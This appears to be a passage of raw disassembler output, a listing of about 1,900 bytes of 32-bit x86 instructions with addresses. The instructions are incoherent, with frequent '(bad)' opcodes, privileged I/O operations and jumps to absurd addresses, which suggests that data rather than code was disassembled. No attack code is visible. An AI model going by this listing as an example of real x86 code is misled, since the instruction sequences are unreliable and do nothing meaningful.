  4049ad:	out    0xcd,eax
  4049af:	ins    DWORD PTR es:[edi],dx
  4049b0:	adc    DWORD PTR [esi+ebp*2],esi
  4049b3:	and    cl,ch
  4049b5:	(bad)
  4049b9:	fild   QWORD PTR [ebx+ecx*2-0x5d0de695]
  4049c0:	icebp  
  4049c1:	and    eax,0xbbfa4e5b
  4049c6:	call   0x674b:0x3a1cd6a2
  4049cd:	jns    0x404969
  4049cf:	xor    DWORD PTR [ebp-0x67],ebx
  4049d2:	mov    bh,0x82
  4049d4:	sub    DWORD PTR [esp+ebx*1],0x4d5191e2
  4049db:	retf   0x5fc3
  4049de:	popa   
  4049df:	pop    ecx
  4049e0:	ret    0xa15a
  4049e3:	mov    BYTE PTR [esp+edi*2+0x350ebc1b],ah
  4049ea:	mov    es,WORD PTR [ecx+ecx*8+0x79]
  4049ee:	xchg   edi,eax
  4049ef:	bnd call 0x8ddecb92
  4049f5:	mov    BYTE PTR [eax+0x7bc6da1c],dl
  4049fb:	scas   eax,DWORD PTR es:[edi]
  4049fc:	jo     0x4049eb
  4049fe:	mov    dl,0x7e
  404a00:	pop    ebx
  404a01:	and    DWORD PTR ds:0xad62bab4,edi
  404a07:	popf   
  404a08:	dec    edx
  404a09:	jmp    0x12c7f405
  404a0e:	aad    0xf5
  404a10:	and    eax,0xad6528aa
  404a15:	add    DWORD PTR [esi+0x76cc3c51],esp
  404a1b:	jge    0x4049b3
  404a1d:	data16 xor ah,BYTE PTR [eax+0x2d]
  404a21:	lods   al,BYTE PTR gs:[esi]
  404a23:	loop   0x404a66
  404a25:	outs   dx,BYTE PTR ds:[esi]
  404a26:	push   ss
  404a27:	xlat   BYTE PTR ds:[ebx]
  404a28:	xchg   edx,eax
  404a29:	aad    0x5e
  404a2b:	inc    ebx
  404a2c:	fs and al,0xcf
  404a2f:	dec    ebp
  404a30:	dec    eax
  404a31:	lods   al,BYTE PTR ds:[esi]
  404a32:	mov    ebp,0x7cc9a15a
  404a37:	cmp    DWORD PTR [edi],esi
  404a39:	pop    edx
  404a3a:	test   dl,cl
  404a3c:	xlat   BYTE PTR ds:[ebx]
  404a3d:	test   al,0x52
  404a3f:	or     al,0x27
  404a41:	and    al,0xa2
  404a43:	pop    esp
  404a44:	fwait
  404a45:	iret   
  404a46:	xor    eax,0x3db87b13
  404a4b:	sbb    edi,edx
  404a4d:	mov    bh,0xda
  404a4f:	bound  esi,QWORD PTR [edi]
  404a51:	add    eax,0xbe3a93a7
  404a56:	stc    
  404a57:	ja     0x404a45
  404a59:	sti    
  404a5a:	pusha  
  404a5b:	dec    esi
  404a5c:	jb     0x404a29
  404a5e:	jl     0x404a59
  404a60:	inc    ebx
  404a61:	add    DWORD PTR [ebx+edx*8+0x651f7954],ebp
  404a68:	mov    eax,DWORD PTR [esi+0x7ded894a]
  404a6e:	retf   0xa4a
  404a71:	pop    esi
  404a72:	push   esi
  404a73:	bound  edx,QWORD PTR [esi+0x2aee39fb]
  404a79:	stos   BYTE PTR es:[edi],al
  404a7a:	clc    
  404a7b:	xor    al,0xd1
  404a7d:	sub    al,0xbd
  404a7f:	sbb    dl,bl
  404a81:	cmp    DWORD PTR [eax],ecx
  404a83:	xchg   DWORD PTR [eax],ebx
  404a85:	not    BYTE PTR [ebp+0x4]
  404a88:	push   ebx
  404a89:	sahf   
  404a8a:	mov    cl,0x81
  404a8c:	sbb    DWORD PTR [ebp+edx*8+0x328d85f9],edi
  404a93:	adc    edx,DWORD PTR [edi-0x2cfac6e8]
  404a99:	gs into 
  404a9b:	out    dx,al
  404a9c:	lea    esp,[edi+0x53]
  404a9f:	dec    esp
  404aa0:	dec    ecx
  404aa1:	sub    ebx,eax
  404aa3:	add    al,0xe
  404aa5:	sar    DWORD PTR [ecx+ebp*8],0x8a
  404aa9:	cmp    ah,BYTE PTR [ebx]
  404aab:	pop    esi
  404aac:	loop   0x404a43
  404aae:	(bad)  [eax-0x6c]
  404ab1:	mov    bh,0x45
  404ab3:	not    BYTE PTR [ebx]
  404ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ab6:	dec    edx
  404ab7:	xor    bh,BYTE PTR [esi-0x72711a39]
  404abd:	fnstenv [esi-0x4c05edd2]
  404ac3:	mov    al,bl
  404ac5:	outs   dx,DWORD PTR ds:[esi]
  404ac6:	mov    fs,WORD PTR [esi+0x11]
  404ac9:	into   
  404aca:	xor    BYTE PTR [edi+0x3f14f3c3],ah
  404ad0:	mov    eax,0x59ab10b5
  404ad5:	cs cli 
  404ad7:	jne    0x404a8e
  404ad9:	mov    ah,0xbc
  404adb:	mov    cl,0x15
  404add:	cmp    BYTE PTR [esi-0x72],0x35
  404ae1:	sbb    al,0x26
  404ae3:	xchg   ebp,esi
  404ae5:	push   edi
  404ae6:	push   esp
  404ae7:	push   eax
  404ae8:	push   es
  404ae9:	xor    BYTE PTR [bx+0x54],ch
  404aed:	add    esp,edi
  404aef:	cmp    eax,0xa70a9a1c
  404af4:	or     al,ch
  404af6:	jne    0x404ab6
  404af8:	push   cs
  404af9:	test   DWORD PTR [eax],eax
  404afb:	adc    edi,ebp
  404afd:	cli    
  404afe:	jg     0x404b6c
  404b00:	bnd jns 0x404aa6
  404b03:	xor    al,0x46
  404b05:	stos   BYTE PTR es:[edi],al
  404b06:	bound  ebp,QWORD PTR [edi+0x63]
  404b09:	clc    
  404b0a:	daa    
  404b0b:	(bad)  
  404b0d:	(bad)  
  404b0e:	sub    al,0xde
  404b10:	call   0x8b97e41
  404b15:	test   al,0xea
  404b17:	xchg   esp,eax
  404b18:	or     BYTE PTR [ebx],dh
  404b1a:	push   edi
  404b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b1c:	add    al,0xb
  404b1e:	addr16 mov eax,ecx
  404b21:	mov    edi,0x5a826824
  404b26:	mov    ch,0x66
  404b28:	push   ecx
  404b29:	and    bl,0x8f
  404b2c:	test   BYTE PTR [edx+0x18373b9e],cl
  404b32:	or     BYTE PTR [edi+0x6a76b67e],dh
  404b38:	mov    ah,BYTE PTR [ecx+ebp*1-0x50ecb924]
  404b3f:	add    ah,BYTE PTR [esi+0x60eaa1db]
  404b45:	and    ebp,esp
  404b47:	push   ecx
  404b48:	addr16 into 
  404b4a:	ret    
  404b4b:	mov    dh,0x1d
  404b4d:	xchg   ebp,eax
  404b4e:	es mov dl,0xed
  404b51:	xchg   edi,eax
  404b52:	pop    ebp
  404b53:	loop   0x404b51
  404b55:	adc    bh,BYTE PTR [edx]
  404b57:	mov    ds:0x3d052434,eax
  404b5c:	ja     0x404ae8
  404b5e:	xor    dh,BYTE PTR [ebp+0x19]
  404b61:	push   ecx
  404b62:	pop    edx
  404b63:	xchg   esi,edx
  404b65:	int3   
  404b66:	sub    BYTE PTR [eax-0x51],0x9b
  404b6a:	xchg   ebx,eax
  404b6b:	pop    ebp
  404b6c:	into   
  404b6d:	jno    0x404b98
  404b6f:	adc    al,0x0
  404b71:	and    DWORD PTR [esi-0x54aa8421],ecx
  404b77:	mov    esp,0x91f1fdd3
  404b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b7d:	dec    edi
  404b7e:	fbstp  TBYTE PTR [ebx]
  404b80:	xchg   ecx,esi
  404b82:	mov    esp,0xc3abb951
  404b87:	cld    
  404b88:	push   ebp
  404b89:	lea    edx,[eax+0x2c16415d]
  404b8f:	dec    edi
  404b90:	adc    al,0x9e
  404b92:	cli    
  404b93:	retf   
  404b94:	sbb    DWORD PTR [ecx],0xffffff9b
  404b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b98:	not    DWORD PTR [ebp-0x5d425283]
  404b9e:	into   
  404b9f:	push   eax
  404ba0:	mov    al,0xda
  404ba2:	mov    eax,ds:0xb05d21b8
  404ba7:	loope  0x404b43
  404ba9:	mov    edx,0x55df4e17
  404bae:	dec    edi
  404baf:	pop    ecx
  404bb0:	add    al,0x6f
  404bb2:	popf   
  404bb3:	xchg   BYTE PTR [esi+0x6c27cd10],dl
  404bb9:	gs hlt 
  404bbb:	fbstp  TBYTE PTR [ebx-0x78]
  404bbe:	push   ds
  404bbf:	jb     0x404c37
  404bc1:	pop    ebp
  404bc2:	push   eax
  404bc3:	dec    edi
  404bc4:	in     al,0x50
  404bc6:	test   al,0x7c
  404bc8:	adc    ebx,esi
  404bca:	add    eax,DWORD PTR [ecx-0x43b01099]
  404bd0:	inc    eax
  404bd1:	push   esp
  404bd2:	sub    eax,0x58e2c34c
  404bd7:	retf   0x1422
  404bda:	xchg   ebp,eax
  404bdb:	mov    bh,0x66
  404bdd:	xlat   BYTE PTR ds:[ebx]
  404bde:	ret    0xf49f
  404be1:	push   es
  404be2:	xchg   esi,eax
  404be3:	dec    di
  404be5:	sub    dl,dh
  404be7:	data16 cmp cl,BYTE PTR [edi-0x15046906]
  404bee:	push   ecx
  404bef:	sub    al,0x7d
  404bf1:	jno    0x404bf4
  404bf3:	sub    bl,BYTE PTR [edx-0x69675e7]
  404bf9:	or     al,0xb1
  404bfb:	nop
  404bfc:	stc    
  404bfd:	xor    BYTE PTR [ebx],ch
  404bff:	xchg   ebp,eax
  404c00:	scas   eax,DWORD PTR es:[edi]
  404c01:	inc    esi
  404c02:	dec    edx
  404c03:	imul   esi,DWORD PTR [eax+0xc],0x336bb533
  404c0a:	hlt    
  404c0b:	cld    
  404c0c:	jns    0x404be8
  404c0e:	nop
  404c0f:	lahf   
  404c10:	cmp    al,0x79
  404c12:	pop    ss
  404c13:	loop   0x404c25
  404c15:	sar    DWORD PTR [edx+0x67598d63],1
  404c1b:	or     dl,BYTE PTR [esi+0xc]
  404c1e:	mov    esi,0x363d2ca6
  404c23:	dec    eax
  404c24:	das    
  404c25:	into   
  404c26:	xor    edi,esp
  404c28:	jbe    0x404c66
  404c2a:	(bad)  
  404c2b:	or     dl,BYTE PTR [ecx-0x1ffb2e16]
  404c31:	jecxz  0x404c8d
  404c33:	sub    al,0xdb
  404c35:	hlt    
  404c36:	out    dx,al
  404c37:	pop    ss
  404c38:	mov    ds:0x8e50e51f,al
  404c3d:	(bad)  
  404c3e:	sub    eax,0x437fbd30
  404c43:	fnstenv [ebx-0x4a]
  404c46:	inc    esp
  404c47:	lahf   
  404c48:	loopne 0x404c7a
  404c4a:	xor    eax,0xdc9bb764
  404c4f:	cmp    BYTE PTR [edx-0x6c],ah
  404c52:	mov    bl,0xe9
  404c54:	lock gs int3 
  404c57:	cld    
  404c58:	xchg   esi,eax
  404c59:	push   0xfffffffe
  404c5b:	in     eax,0x51
  404c5d:	push   esp
  404c5e:	mov    es,WORD PTR [edi]
  404c60:	(bad)  
  404c61:	jmp    0x9bebe5d3
  404c66:	out    0x70,al
  404c68:	repz mov edx,0xcbf39213
  404c6e:	std    
  404c6f:	bound  ebp,QWORD PTR [edi]
  404c71:	je     0x404c71
  404c73:	sahf   
  404c74:	fdiv   st(3),st
  404c76:	mov    esp,0x60d7451d
  404c7b:	es jbe 0x404cc8
  404c7e:	ds inc edx
  404c80:	bnd ja 0x404c2b
  404c83:	inc    ecx
  404c84:	icebp  
  404c85:	cmc    
  404c86:	aaa    
  404c87:	stos   BYTE PTR es:[edi],al
  404c88:	push   ebp
  404c89:	xchg   esi,eax
  404c8a:	mov    ds:0x6ecb9673,eax
  404c8f:	mov    bl,0xe9
  404c91:	cli    
  404c92:	ror    BYTE PTR [edx],1
  404c94:	jne    0x404c5e
  404c96:	mov    cl,0x8a
  404c98:	push   es
  404c99:	sbb    DWORD PTR [ebp+0x48f75104],esp
  404c9f:	iret   
  404ca0:	sub    eax,DWORD PTR [eax-0x3c]
  404ca3:	test   al,0xb1
  404ca5:	inc    eax
  404ca6:	push   es
  404ca7:	mov    al,0x87
  404ca9:	daa    
  404caa:	jge    0x404c9a
  404cac:	cs mov dh,0x29
  404caf:	pop    ecx
  404cb0:	xchg   edx,eax
  404cb1:	sahf   
  404cb2:	adc    al,0xaa
  404cb4:	cli    
  404cb5:	and    al,0xf3
  404cb7:	pusha  
  404cb8:	adc    dl,dh
  404cba:	pop    ebx
  404cbb:	pop    esp
  404cbc:	int3   
  404cbd:	adc    ebp,DWORD PTR [ecx+0x28]
  404cc0:	into   
  404cc1:	data16 je 0x404d3c
  404cc4:	imul   esi,DWORD PTR [esi],0x859f5e09
  404cca:	sbb    ecx,esi
  404ccc:	in     eax,0x2
  404cce:	xchg   ebp,eax
  404ccf:	data16 ds loop 0x404d37
  404cd3:	pop    ss
  404cd4:	repnz out dx,eax
  404cd6:	arpl   ax,dx
  404cd8:	xor    BYTE PTR [eax],cl
  404cda:	jno    0x404ca7
  404cdc:	pushf  
  404cdd:	int3   
  404cde:	ja     0x404cc2
  404ce0:	xchg   ecx,eax
  404ce1:	add    cl,BYTE PTR [ecx-0x31d152f6]
  404ce7:	or     al,0x2f
  404ce9:	xchg   edi,eax
  404cea:	push   ebx
  404ceb:	loop   0x404c7a
  404ced:	sti    
  404cee:	test   al,0x70
  404cf0:	push   ds
  404cf1:	aam    0x36
  404cf3:	xor    ch,ah
  404cf5:	adc    BYTE PTR [edi+ebx*4+0x0],bl
  404cf9:	sub    DWORD PTR [esi-0x67d4dd01],esp
  404cff:	push   ebp
  404d00:	push   ds
  404d01:	push   esp
  404d02:	imul   eax,DWORD PTR ds:0xd9201a3d,0x17
  404d09:	jmp    0x4bf9:0x4ac39eeb
  404d10:	mov    cl,BYTE PTR [ebx]
  404d12:	jmp    0xff011dcd
  404d17:	pop    esp
  404d18:	shl    ebp,1
  404d1a:	jno    0x404d52
  404d1c:	jle    0x404d4a
  404d1e:	outs   dx,BYTE PTR ds:[esi]
  404d1f:	push   es
  404d20:	adc    esi,DWORD PTR ds:0xfa3effb1
  404d26:	stc    
  404d27:	aaa    
  404d28:	mov    ebp,DWORD PTR ss:[eax+0x63edfc41]
  404d2f:	cmp    al,0xaa
  404d31:	fwait
  404d32:	test   DWORD PTR [ebp-0xc],edx
  404d35:	out    0x1d,eax
  404d37:	int3   
  404d38:	popf   
  404d39:	sbb    al,0xe2
  404d3b:	stos   DWORD PTR es:[edi],eax
  404d3c:	add    al,0xd2
  404d3e:	test   al,0xda
  404d40:	test   ebx,esi
  404d42:	sub    al,0x9
  404d44:	ret    0xb8b3
  404d47:	push   es
  404d48:	xor    ebp,DWORD PTR [esi+0x34e32f71]
  404d4e:	dec    edi
  404d4f:	push   cs
  404d50:	and    edi,DWORD PTR [eax+0x3f]
  404d53:	add    al,0xcd
  404d55:	call   0xb9b9a727
  404d5a:	cs je  0x404d2d
  404d5d:	jno    0x404db4
  404d5f:	mov    WORD PTR [ecx],fs
  404d61:	jmp    0x1736:0xed766b9d
  404d68:	rcl    cl,0x8b
  404d6b:	push   eax
  404d6c:	je     0x404d0e
  404d6e:	(bad)  
  404d6f:	sub    DWORD PTR [esi],esp
  404d71:	inc    edi
  404d72:	xor    BYTE PTR [ebx+ecx*1+0x390d3c45],bh
  404d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d7a:	retf   0x3196
  404d7d:	mov    ch,0x90
  404d7f:	outs   dx,BYTE PTR ds:[si]
  404d81:	mov    al,0x8d
  404d83:	in     eax,0x3
  404d85:	(bad)  
  404d86:	pushf  
  404d87:	repnz in eax,0x58
  404d8a:	(bad)  
  404d8b:	jg     0x404dda
  404d8d:	out    dx,eax
  404d8e:	stc    
  404d8f:	sbb    al,0xf0
  404d91:	js     0x404d88
  404d93:	stos   BYTE PTR es:[edi],al
  404d94:	les    esp,FWORD PTR ds:0x2ecd654f
  404d9a:	fwait
  404d9b:	add    al,0xfc
  404d9d:	mov    ecx,0x98407321
  404da2:	ds nop
  404da4:	or     dh,BYTE PTR [esi-0x2948ccc6]
  404daa:	push   ebp
  404dab:	imul   esi,DWORD PTR [ecx+ebp*1+0x0],0xb632c933
  404db3:	outs   dx,DWORD PTR ds:[esi]
  404db4:	lea    ebx,[ebp+0x16]
  404db7:	mov    dl,0x31
  404db9:	es push ss
  404dbb:	jmp    0x4bed:0x7065dd43
  404dc2:	xchg   esi,eax
  404dc3:	rcr    BYTE PTR ds:0x97eb3cec,1
  404dc9:	lods   eax,DWORD PTR ds:[esi]
  404dca:	data16 cmc 
  404dcc:	gs cdq 
  404dce:	mov    ebx,0x7b6b68ca
  404dd3:	in     al,0x43
  404dd5:	scas   eax,DWORD PTR es:[edi]
  404dd6:	mov    ds:0xaabe9109,al
  404ddb:	(bad)  
  404ddc:	xchg   esp,eax
  404ddd:	cmp    DWORD PTR [esi+0x60],eax
  404de0:	(bad)  
  404de1:	cmc    
  404de2:	dec    eax
  404de3:	pusha  
  404de4:	xchg   esi,eax
  404de5:	js     0x404e03
  404de7:	bound  ebp,QWORD PTR [edx]
  404de9:	and    eax,0xb4730fe4
  404dee:	(bad)  
  404def:	lods   eax,DWORD PTR ds:[esi]
  404df0:	sbb    eax,0xd6e2d93e
  404df5:	mov    ebx,DWORD PTR [edi-0x22c87945]
  404dfb:	xchg   edi,eax
  404dfc:	mov    ebp,0x1d6f145b
  404e01:	das    
  404e02:	and    edi,DWORD PTR [ecx]
  404e04:	and    edi,DWORD PTR [edi-0x392c808f]
  404e0a:	in     al,0x3e
  404e0c:	jmp    0x404e3a
  404e0e:	dec    esp
  404e0f:	int    0xa3
  404e11:	out    dx,eax
  404e12:	mov    ecx,0x8697798e
  404e17:	push   edx
  404e18:	call   0xec9e6486
  404e1d:	inc    eax
  404e1e:	xchg   esi,eax
  404e1f:	nop
  404e20:	ret    
  404e21:	mov    esi,esp
  404e23:	jmp    0x6d0e:0xf577456a
  404e2a:	xor    eax,0x3719281b
  404e2f:	or     ah,BYTE PTR [edx+0x1d]
  404e32:	test   ebx,eax
  404e34:	pop    es
  404e35:	sbb    bl,dl
  404e37:	and    al,0x1c
  404e39:	mov    ebp,0x933bdefd
  404e3e:	dec    ebx
  404e3f:	loopne 0x404de7
  404e41:	dec    esi
  404e42:	xchg   ebx,eax
  404e43:	loop   0x404e43
  404e45:	inc    edx
  404e46:	xchg   esi,eax
  404e47:	loop   0x404eb8
  404e49:	les    ebx,FWORD PTR [eax]
  404e4b:	add    BYTE PTR [edi],dl
  404e4d:	rcl    esp,cl
  404e4f:	sbb    esp,edi
  404e51:	sub    al,0xd
  404e53:	sub    eax,DWORD PTR [esp+ebp*8+0x66]
  404e57:	adc    BYTE PTR [ecx-0x80],dh
  404e5a:	xchg   ebx,eax
  404e5b:	inc    ecx
  404e5c:	lahf   
  404e5d:	or     eax,0x7f887683
  404e62:	bound  eax,QWORD PTR [ebx+0x60c3ecda]
  404e68:	sbb    eax,DWORD PTR [edx+0x3f]
  404e6b:	cdq    
  404e6c:	xchg   DWORD PTR [ebx],esi
  404e6e:	or     BYTE PTR [edi],cl
  404e70:	fdivr  DWORD PTR [eax-0x1791857f]
  404e76:	ja     0x404ece
  404e78:	scas   al,BYTE PTR es:[edi]
  404e79:	sti    
  404e7a:	adc    bh,cl
  404e7c:	pop    es
  404e7d:	dec    edx
  404e7e:	adc    DWORD PTR [ebp-0x1e6f0143],ebp
  404e84:	cs aaa 
  404e86:	shl    BYTE PTR [esi],cl
  404e88:	(bad)  
  404e89:	in     al,dx
  404e8a:	pushf  
  404e8b:	sbb    esi,DWORD PTR [esi-0x73]
  404e8e:	out    dx,al
  404e8f:	xor    BYTE PTR [ecx],0x7f
  404e92:	fcmove st,st(5)
  404e94:	mov    al,0x36
  404e96:	cs dec esi
  404e98:	ja     0x404ec4
  404e9a:	int    0xdd
  404e9c:	stc    
  404e9d:	xchg   DWORD PTR ds:0x9a39eaf9,esp
  404ea3:	call   0x854e40f4
  404ea8:	cmp    DWORD PTR [bx+0x68],eax
  404eac:	inc    edi
  404ead:	aas    
  404eae:	dec    esp
  404eaf:	mov    cl,0xec
  404eb1:	sbb    ebx,esp
  404eb3:	pushf  
  404eb4:	pop    eax
  404eb5:	or     al,0x2b
  404eb7:	scas   eax,DWORD PTR es:[edi]
  404eb8:	in     al,dx
  404eb9:	retf   0x3b80
  404ebc:	mov    eax,ds:0x4f71962c
  404ec1:	xchg   edx,eax
  404ec2:	and    DWORD PTR [edx+eax*2-0x182b09d5],edx
  404ec9:	inc    esi
  404eca:	aaa    
  404ecb:	rcr    eax,1
  404ecd:	retf   0x34ab
  404ed0:	mov    eax,ds:0x5b6e6158
  404ed5:	add    eax,0x232e143f
  404eda:	push   edx
  404edb:	cmp    cl,BYTE PTR [esp+edx*2]
  404ede:	inc    esi
  404edf:	cmp    ebp,DWORD PTR [ecx-0x1d]
  404ee2:	inc    dh
  404ee4:	adc    DWORD PTR [esi-0x9f86e13],edi
  404eea:	cmp    BYTE PTR [esp+edi*1+0x57],bl
  404eee:	std    
  404eef:	jl     0x404efc
  404ef1:	rcr    DWORD PTR [esi],cl
  404ef3:	iret   
  404ef4:	inc    ebx
  404ef5:	jl     0x404f1b
  404ef7:	sub    al,0xa2
  404ef9:	ja     0x404ee5
  404efb:	bound  ecx,QWORD PTR fs:[ebp+0x50]
  404eff:	xchg   edx,eax
  404f00:	mov    ecx,0x55980fc0
  404f05:	or     eax,0x80f02b06
  404f0a:	aas    
  404f0b:	add    cl,BYTE PTR ss:[edx+0x71]
  404f0f:	(bad)  
  404f10:	outs   dx,DWORD PTR ds:[esi]
  404f11:	jnp    0x404ee1
  404f13:	adc    DWORD PTR [esi+0x7e],esp
  404f16:	fbld   TBYTE PTR [ebx-0x57]
  404f19:	xlat   BYTE PTR ds:[ebx]
  404f1a:	adc    edx,DWORD PTR [ebp+ebx*8+0x47]
  404f1e:	jno    0x404edf
  404f20:	scas   al,BYTE PTR es:[edi]
  404f21:	je     0x404f21
  404f23:	hlt    
  404f24:	cmp    BYTE PTR [esi-0x7f1d451d],ch
  404f2a:	ss ins DWORD PTR es:[edi],dx
  404f2c:	loope  0x404f60
  404f2e:	fcmovu st,st(6)
  404f30:	adc    DWORD PTR [ecx+edx*8+0x618fdd5f],ebx
  404f37:	out    dx,eax
  404f38:	push   ebp
  404f39:	jno    0x404ec8
  404f3b:	pusha  
  404f3c:	adc    al,0x45
  404f3e:	mov    ds:0x3bf9c8bf,eax
  404f43:	jae    0x404ef6
  404f45:	fnstenv ds:0xc5acdd33
  404f4b:	pushf  
  404f4c:	xchg   edx,eax
  404f4d:	xchg   DWORD PTR [bx+si],ecx
  404f50:	pop    eax
  404f51:	stos   DWORD PTR es:[edi],eax
  404f52:	sub    dh,BYTE PTR [edi-0x2f04d742]
  404f58:	repnz frstor [esi]
  404f5b:	mov    eax,ds:0xf91cec57
  404f60:	out    dx,al
  404f61:	xchg   edx,eax
  404f62:	xor    bh,bh
  404f64:	pop    ds
  404f65:	sbb    ch,BYTE PTR [ebx+0x2c]
  404f68:	mov    bh,0xed
  404f6a:	jle    0x404ef4
  404f6c:	push   ecx
  404f6d:	fdivr  st(4),st
  404f6f:	mov    edi,0x41b3ab83
  404f74:	jmp    0xda766019
  404f79:	inc    ecx
  404f7a:	and    edi,DWORD PTR [eax-0x4]
  404f7d:	lock xor al,0xe
  404f80:	int    0xcc
  404f82:	push   ecx
  404f83:	ret    
  404f84:	(bad)  
  404f85:	test   al,0xea
  404f87:	cld    
  404f88:	fmul   QWORD PTR [esi+0x29783e77]
  404f8e:	outs   dx,DWORD PTR ds:[esi]
  404f8f:	retf   
  404f90:	lahf   
  404f91:	and    eax,0x32e9644c
  404f96:	fimul  WORD PTR [ebx+ecx*2-0x64]
  404f9a:	mov    ch,0x81
  404f9c:	mov    ebx,0xa3e4e17c
  404fa1:	loope  0x404f68
  404fa3:	outs   dx,BYTE PTR ds:[esi]
  404fa4:	adc    eax,0xf9b6b4e9
  404fa9:	outs   dx,DWORD PTR ds:[esi]
  404faa:	popa   
  404fab:	dec    edx
  404fac:	mov    ?,WORD PTR [esi]
  404fae:	in     al,0x59
  404fb0:	outs   dx,BYTE PTR ds:[esi]
  404fb1:	sar    BYTE PTR [ecx-0x3e9f2f76],0x5f
  404fb8:	in     eax,0xc8
  404fba:	call   0x3b906240
  404fbf:	std    
  404fc0:	mov    ch,0x5
  404fc2:	addr16 in eax,dx
  404fc4:	outs   dx,BYTE PTR ds:[esi]
  404fc5:	inc    esi
  404fc6:	paddq  mm4,QWORD PTR [eax-0x61d3e691]
  404fcd:	lahf   
  404fce:	mov    dl,bl
  404fd0:	and    esi,esp
  404fd2:	loope  0x404f81
  404fd4:	dec    esp
  404fd5:	push   ecx
  404fd6:	jns    0x405034
  404fd8:	xchg   BYTE PTR [ebx],bh
  404fda:	adc    dh,BYTE PTR [edi+0x76]
  404fdd:	xor    ecx,DWORD PTR ds:0x50c771ae
  404fe3:	outs   dx,DWORD PTR ds:[esi]
  404fe4:	pop    ebp
  404fe5:	scas   al,BYTE PTR es:[edi]
  404fe6:	cmp    DWORD PTR [ecx+0x35b9eda0],0x3d
  404fed:	int3   
  404fee:	mov    bl,0x14
  404ff0:	mov    edi,0x2693082d
  404ff5:	xchg   BYTE PTR [esi-0x71],dh
  404ff8:	lock xor BYTE PTR [esi+ebp*2-0x1db2108],dh
  405000:	scas   eax,DWORD PTR es:[edi]
  405001:	sbb    edx,DWORD PTR [esi-0x656cc315]
  405007:	in     eax,0xbd
  405009:	lds    ebp,FWORD PTR [edx]
  40500b:	sbb    BYTE PTR [ebx+eax*2],dl
  40500e:	in     eax,0x10
  405010:	or     eax,0x67e371f1
  405015:	out    0x8f,eax
  405017:	push   esp
  405018:	adc    al,0x4e
  40501a:	mov    DWORD PTR [eax],0xbbf11366
  405020:	retf   
  405021:	add    al,0x4f
  405023:	les    esi,FWORD PTR [ebp-0x48]
  405026:	icebp  
  405027:	leave  
  405028:	pop    edi
  405029:	leave  
  40502a:	(bad)  
  40502c:	stos   BYTE PTR es:[edi],al
  40502d:	jp     0x405018
  40502f:	lahf   
  405030:	jo     0x404fef
  405032:	sbb    cl,dl
  405034:	std    
  405035:	cmp    edi,DWORD PTR [edx]
  405037:	nop
  405038:	fidivr DWORD PTR [ecx+0x201ed60d]
  40503e:	rol    DWORD PTR [ecx+0x6d],0xff
  405042:	fnstenv [ebx*1-0x12c63f7]
  405049:	inc    ebp
  40504a:	lea    esp,ds:0xf82a4690
  405050:	jmp    0x405083
  405052:	inc    edx
  405053:	rol    dl,0xa3
  405056:	xor    DWORD PTR [eax],esi
  405058:	out    dx,al
  405059:	jae    0x40500c
  40505b:	or     cl,BYTE PTR [eax]
  40505d:	loop   0x4050c1
  40505f:	stc    
  405060:	enter  0x6995,0x9b
  405064:	push   ss
  405065:	adc    al,0xf9
  405067:	or     dh,0x8
  40506a:	shr    DWORD PTR [ebx-0x3e],cl
  40506d:	shr    DWORD PTR [eax],1
  40506f:	cmp    dh,dl
  405071:	cmp    bl,BYTE PTR [edx-0x2fe4dd58]
  405077:	mov    dl,0xb1
  405079:	outs   dx,DWORD PTR ds:[esi]
  40507a:	inc    esp
  40507b:	adc    BYTE PTR [edx],dl
  40507d:	pop    ss
  40507e:	int3   
  40507f:	sbb    al,0x22
  405081:	cmp    BYTE PTR fs:[edi],0x27
  405085:	xchg   edx,eax
  405086:	cmp    al,0x5b
  405088:	push   edx
  405089:	imul   esp,DWORD PTR [ebx+0x3283f63f],0xffffffd7
  405090:	mov    ch,0xc9
  405092:	mov    al,0x92
  405094:	test   BYTE PTR [esi],0x83
  405097:	ret    0x75d4
  40509a:	adc    al,BYTE PTR [eax]
  40509c:	pusha  
  40509d:	cs pop edi
  40509f:	daa    
  4050a0:	iret   
  4050a1:	aad    0x72
  4050a3:	push   0xc8b70585
  4050a8:	cli    
  4050a9:	scas   al,BYTE PTR es:[edi]
  4050aa:	and    esi,ecx
  4050ac:	pop    edi
  4050ad:	sub    eax,0xa1f1f52
  4050b2:	test   eax,0xac512b37
  4050b7:	out    0x36,eax
  4050b9:	outs   dx,DWORD PTR ds:[esi]
  4050ba:	ja     0x405136
  4050bc:	(bad)  
  4050bd:	not    BYTE PTR [esi+0x463402ae]
  4050c3:	push   ebx
  4050c4:	inc    ecx
  4050c5:	ja     0x4050cc
  4050c7:	pop    edx
  4050c8:	xchg   ebp,eax
  4050c9:	sub    ah,al
  4050cb:	mov    bl,0xf5
  4050cd:	sub    DWORD PTR [edx+0x588068b4],ebp
  4050d3:	ins    DWORD PTR es:[edi],dx
  4050d4:	dec    eax
  4050d5:	mov    esp,0x572164b7
  4050da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050db:	adc    al,0xd
  4050dd:	xor    BYTE PTR [esi+0x52892aff],dh
  4050e3:	add    bh,BYTE PTR [esi-0x7f229c86]
  4050e9:	mov    bh,0x3
  4050eb:	sub    DWORD PTR [ecx+0x12],ecx
  4050ee:	loop   0x405116
  4050f0:	jo     0x405118
  4050f2:	pop    ebp
  4050f3:	cli    
  4050f4:	mov    ah,cl
  4050f6:	sahf   
  4050f7:	in     eax,dx
  4050f8:	mov    esp,0x8ee5d14e
  4050fd:	repnz dec eax
  4050ff:	or     BYTE PTR [ecx+0x44],cl
  405102:	(bad)  
  405103:	imul   ebp,DWORD PTR [eax+0x5eeb60f2],0x27
  40510a:	popa   
  40510b:	cmp    BYTE PTR [eax+ebp*4-0x5259e109],0xeb
  405113:	imul   edi,DWORD PTR [ebx+ecx*4],0xffffffac
  405117:	and    eax,0xf9f76766
  40511c:	ins    DWORD PTR es:[edi],dx
  40511d:	lds    ebp,FWORD PTR [ebx-0x4ad9bea7]
  405123:	pop    eax
  405124:	mov    edi,0xcb0ca031
  405129:	inc    ebx
  40512a:	enter  0x45ee,0x2d
  40512e:	fwait
  40512f:	mov    bh,0xc6
  405131:	jp     0x405175
  405133:	daa    
  405134:	push   ss
  405135:	push   cs
  405136:	es loop 0x405122
  405139:	add    cl,cl
  40513b:	mov    cl,0x50
